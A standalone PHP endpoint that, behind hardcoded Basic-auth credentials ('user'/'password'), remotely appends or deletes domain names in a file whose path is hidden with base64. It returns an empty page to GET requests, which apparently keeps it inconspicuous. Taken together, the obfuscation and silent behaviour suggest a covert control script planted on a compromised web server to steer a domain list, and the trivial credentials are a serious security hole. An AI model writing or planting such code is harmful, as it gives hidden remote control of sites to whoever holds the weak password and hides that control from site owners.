<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $valid_user = 'user';
    $valid_pass = 'password';

    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] !== $valid_user || $_SERVER['PHP_AUTH_PW'] !== $valid_pass) {
        header('WWW-Authenticate: Basic realm="My Realm"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'xxx'; // errorAut
        exit;
    }

    if (isset($_POST['siteList']) || isset($_POST['domain'])) {
        $dirpth = base64_decode('L3NpdGVzL2Q');
        $file = $dirpth . '/'.base64_decode('ZG9tYWlucy50eHQ=');
        if ($_POST['req'] === 'add') {
            $siteList = $_POST['siteList'];
            $content = file_get_contents($file);
            if (!empty($content) && substr($content, -1) !== PHP_EOL) { $siteList = PHP_EOL . $siteList;}
            $tulisData = file_put_contents($file, $siteList, FILE_APPEND);
            if ($tulisData !== false) {
                $response = 'done';
            } else {
                $response = 'fail';
            }
        } else if ($_POST['req'] === 'del') {
            $domain = $_POST['domain'];
            $contents = file_get_contents($file);
            $lines = explode("\n", $contents);
            $lines = array_map('trim', $lines); 
            $lineIndex = array_search($domain, $lines);
            if ($lineIndex !== false) {
                unset($lines[$lineIndex]);

                $updatedContents = implode("\n", $lines);

                $hapusData = file_put_contents($file, $updatedContents);
                if ($hapusData !== false) {
                    $response = "done";
                } else {
                    $response = "write failed [server]";
                }
            } else {
                $response = 'fail:' . $domain;
            }
        } else {
            $response = 'no req';
        }
    } else {
        $response = 'not set';
    }
	header('Content-Type: application/json');
	echo json_encode($response);
} else {
	echo '';
}
